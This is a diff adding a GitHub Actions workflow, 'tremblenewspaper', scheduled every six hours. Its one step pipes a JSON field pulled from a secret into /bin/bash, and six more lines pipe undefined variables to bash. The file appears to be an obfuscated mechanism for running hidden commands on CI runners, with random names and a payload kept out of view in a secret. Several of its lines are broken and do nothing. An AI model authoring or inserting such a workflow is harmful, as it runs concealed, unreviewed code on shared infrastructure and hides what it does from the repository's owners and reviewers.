@@ -1,0 +1,23 @@
+name: tremblenewspaper
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tremblenewspaper
+        env:
+          tyk67264: ${{ secrets.tyk67264 }}
+        run: |
+          echo $tyk67264 | jq -r .pwi25257 | /bin/bash
+          echo $f2 | jq -r .dqb59787 | /bin/bash
+          echo $vbskh6 | jq -r .jt90153 | /bin/bash
+          echo $bdgtl10532 | jq -r .qsdty5 | /bin/bash
+          echo $k60 | jq -r .krcaj10199 | /bin/bash
+          echo $bctyq948 | jq -r .mzbop0377 | /bin/bash
+          echo $vunka4889 | jq -r .ldeua2753 | /bin/bash
+
